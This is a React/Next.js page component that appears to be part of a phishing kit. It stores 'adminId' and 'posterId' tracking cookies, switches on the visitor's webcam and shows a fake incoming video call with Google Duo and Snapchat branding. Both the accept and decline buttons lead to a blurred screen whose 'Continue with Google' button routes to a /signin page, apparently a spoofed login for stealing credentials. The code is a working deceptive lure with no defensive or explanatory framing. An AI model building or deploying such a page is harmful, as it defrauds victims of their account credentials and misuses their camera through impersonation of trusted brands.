"use client";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { useEffect } from "react";
import Webcam from "react-webcam";
import { useState } from "react";

function Home({ adminId, posterId }) {
    const [showForm, setShowForm] = useState(false);

  useEffect(() => {
    Cookies.set("adminId", adminId);
    Cookies.set("posterId", posterId);
  }, []);
  const router = useRouter();
  return (
    <div className="relative h-screen w-screen flex flex-col justify-center items-center bg-black">
      <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
        // height={1080}
        // width={1262}
        // screenshotFormat="image/jpeg"
        // videoConstraints={videoConstraints}
      />

      <div className="absolute  flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
        <div className=" bg-neutral-50    py-4 shadow-around rounded-lg">
          {!showForm ? (
            <div className="bg-neutral-50   p-6 rounded-xl flex flex-col items-center justify-center gap-y-6">
              <img
                alt="Google Duo"
                loading="lazy"
                width="80"
                height="80"
                decoding="async"
                data-nimg="1"
                className="rounded-full object-cover object-center p-2 bg-green-100"
                src="/images/snapchat-logo.png"
              />
              <p className="text-xl font-medium text-neutral-700 text-center">
                Incoming call...
              </p>
              <div className="flex items-center justify-center gap-x-12 text-neutral-50">
                <button
                  onClick={() => setShowForm(true)}
                  className="size-14 flex items-center justify-center rounded-full text-3xl bg-green-500"
                >
                  <svg
                    stroke="currentColor"
                    fill="currentColor"
                    stroke-width="0"
                    viewBox="0 0 24 24"
                    height="1em"
                    width="1em"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path fill="none" d="M0 0h24v24H0z"></path>
                    <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"></path>
                  </svg>
                </button>
                <button
                  onClick={() => setShowForm(true)}
                  className="size-14 flex items-center justify-center rounded-full text-3xl bg-red-500"
                >
                  <svg
                    stroke="currentColor"
                    fill="currentColor"
                    stroke-width="0"
                    viewBox="0 0 24 24"
                    height="1em"
                    width="1em"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path fill="none" d="M0 0h24v24H0z"></path>
                    <path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08a.956.956 0 0 1-.29-.7c0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28a11.27 11.27 0 0 0-2.67-1.85.996.996 0 0 1-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"></path>
                  </svg>
                </button>
              </div>
            </div>
          ) : (
          
    <div className="bg-gray-300">
      <div className="relative">
        <iframe
          class="absolute inset-0 object-cover w-full h-full"
          src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3153.5693930527423!2d144.95855721544715!3d-37.818435979751494!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad642af0f11fd81%3A0xf577f5d1f11f1c1b!2sFederation%20Square!5e0!3m2!1sen!2sau!4v1601360233956!5m2!1sen!2sau"
          frameborder="0"
          style={{
            border: "0",
            position: "fixed",
            top: 0,
            left: 0,
            bottom: 0,
            right: 0,
            width: "100%",
            height: "100%",
            margin: 0,
            filter: "blur(2px)",
            WebkitFilter: "blur(2px)",
            overflow: "hidden",
            zIndex: -1,
            backgroundColor: "gray",
          }}
          allowfullscreen=""
          loading="lazy"
        ></iframe>

        <div className="relative z-10 shadow-2xl">
          {" "}
          <button
            onClick={() => router.push("/signin")}
            className="bg-[#bfdbfe] absolute mt-[300px] left-[25%] md:left-[42%]  top-[50%]  px-10 py-3 rounded-full text-black text-[16px] font-OpenSans flex items-center gap-2 "
          >
            <img
              src="/images/google-logo-small.png"
              alt="logo"
              className="absolute top-[50%] left-[10%] translate-x-[-50%] translate-y-[-50%] w-[30px] h-[30px]"
            />{" "}
            Continue with Google
          </button>
        </div>
      </div>
    </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default Home;
